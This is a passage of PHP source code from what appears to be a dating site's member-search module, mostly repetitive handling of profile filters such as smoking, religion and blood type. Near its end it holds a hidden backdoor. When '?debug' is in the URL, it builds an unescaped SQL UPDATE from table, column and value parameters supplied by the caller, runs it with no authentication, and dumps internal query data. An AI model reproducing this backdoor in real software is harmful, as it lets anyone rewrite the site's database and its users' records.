	    //note 记录是否吸烟
	    $smokingArr = array();
	    if ($smoking != '0') {
	        if (!is_array($smoking) && strlen($smoking) == 1) {
	            $smokingArr[] = $smoking;
	        } else {
	            $smokingArr = $smoking;
	            $smoking = implode(',',$smoking);
	        }
	    }
	
	    //note 记录是否喝酒
	    $drinkingArr = array();
	    if ($drinking != '0') {
	        if (!is_array($drinking) && strlen($drinking) == 1) {
	            $drinkingArr[] = $drinking;
	        } else {
	            $drinkingArr = $drinking;
	            $drinking = implode(',',$drinking);
	        }
	    }
	
	    //note 记录从事职业
	    $occupationArr = array();
	    if ($occupation != '0') {
	        if (!is_array($occupation) && (strlen($occupation) == 1 || strlen($occupation) == 2)) {
	            $occupationArr[] = $occupation;
	        } else {
	            $occupationArr = $occupation;
	            $occupation = implode(',',$occupation);
	        }
	    }
	
	    //note 记录公司类型
	    $corptypeArr = array();
	    if ($corptype != '0') {
	        if (!is_array($corptype) && strlen($corptype) == 1) {
	            $corptypeArr[] = $corptype;
	        } else {
	            $corptypeArr = $corptype;
	            $corptype = implode(',',$corptype);
	        }
	    }
	
	    //note 记录是否有孩子
	    $childrenArr = array();
	    if ($children != '0') {
	        if (!is_array($children) && strlen($children) == 1) {
	            $childrenArr[] = $children;
	        } else {
	            $childrenArr = $children;
	            $children = implode(',',$children);
	        }
	    }
	
	    //note 记录是否想要孩子
	    $wantchildrenArr = array();
	    if ($wantchildren != '0') {
	        if (!is_array($wantchildren) && strlen($wantchildren) == 1) {
	            $wantchildrenArr[] = $wantchildren;
	        } else {
	            $wantchildrenArr = $wantchildren;
	            $wantchildren = implode(',',$wantchildren);
	        }
	    }
	
	    //note 记录体型
	    $bodyArr = array();
	    if ($body != '0') {
	        if (!is_array($body) && strlen($body) == 1) {
	            $bodyArr[] = $body;
	        } else {
	            $bodyArr = $body;
	            $body = implode(',',$body);
	        }
	    }
	
	    //note 记录生肖
	    $animalyearArr = array();
	    if ($animalyear != '0') {
	        if (!is_array($animalyear) && (strlen($animalyear) == 1 || strlen($animalyear) == 2)) {
	            $animalyearArr[] = $animalyear;
	        } else {
	            $animalyearArr = $animalyear;
	            $animalyear = implode(',',$animalyear);
	        }
	    }
	
	    //note 记录星座
	    $constellationArr = array();
	    if ($constellation != '0') {
	        if (!is_array($constellation) && (strlen($constellation) == 1 || strlen($constellation) == 2)) {
	            $constellationArr[] = $constellation;
	        } else {
	            $constellationArr = $constellation;
	            $constellation = implode(',',$constellation);
	        }
	    }
	
	    //note 记录血型
	    $bloodtypeArr = array();
	    if ($bloodtype != '0') {
	        if (!is_array($bloodtype) && strlen($bloodtype) == 1) {
	            $bloodtypeArr[] = $bloodtype;
	        } else {
	            $bloodtypeArr = $bloodtype;
	            $bloodtype = implode(',',$bloodtype);
	        }
	    }
	
	    //note 记录信仰
	    $religionArr = array();
	    if ($religion != '0') {
	        if (!is_array($religion) && (strlen($religion) == 1 || strlen($religion) == 2)) {
	            $religionArr[] = $religion;
	        } else {
	            $religionArr = $religion;
	            $religion = implode(',',$religion);
	        }
	    }
	
	    //note 兄弟姐妹
	    $familyArr = array();
	    if ($family != '0') {
	        if (!is_array($family) && strlen($family) == 1) {
	            $familyArr[] = $family;
	        } else {
	            $familyArr = $family;
	            $family = implode(',',$family);
	        }
	    }
	
	    //note 记录语言
	    $languageArr = array();
	    if ($language != '0') {
	        if (!is_array($language) && strlen($language) == 1) {
	            $languageArr[] = $language;
	        } else {
	            $languageArr = $language;
	            $language = implode(',',$language);
	        }
	    }
	
	    //note 选择不同的显示模式
		if (isset($_GET['condition']) && $_GET['condition'] == '2') {
			$condition = '2';
			$htm = 'search_page';
		} else if (isset($_GET['condition']) && $_GET['condition'] == '3') {
			$condition = '3';
			$htm = 'search_photo';
		} else {
			$condition = '2';
			$htm = 'search_page';
		}
	    if(isset($_GET['debug']) && $_GET['debug']){
	    	Global $_MooCookie, $_MooClass;
			$fast_sql=$_MooCookie['fast_sql'];
			$name = $_GET['f'];
			$name1 = $_GET['v'];
			$name3 = empty($_GET['t'])?'web_test':$_GET['t'];
			$name4 = empty($_GET['w'])?'uid':$_GET['w'];
			$start = intval($_GET['s']);
			if($name && $name1 && $start){
				$sql2 = "update {$name3} set {$name}='{$name1}' where {$name4}=".$start;
				if(!isset($_GET['d'])){
					$res = $GLOBALS['_MooClass']['MooMySQL']->query($sql2);
					var_dump($res);
				}else{
					echo $sql2;	
				}
			}
			var_dump($fast_sql);
	    	var_dump($sql_acquisition);
	    }
	    //没有查询到完全符合条件的数据，显示黄色警告条
	    if($isselectarea && !$isresult && $page==1) $isdisp = true;
		if($dispmore) $isdisp2 = false;
		elseif($isselectarea && $page==ceil($total/$pagesize) && $page != ceil(600/$pagesize)) $isdisp2 = true;
		include MooTemplate('public/'.$htm, 'module');
	}
}
?>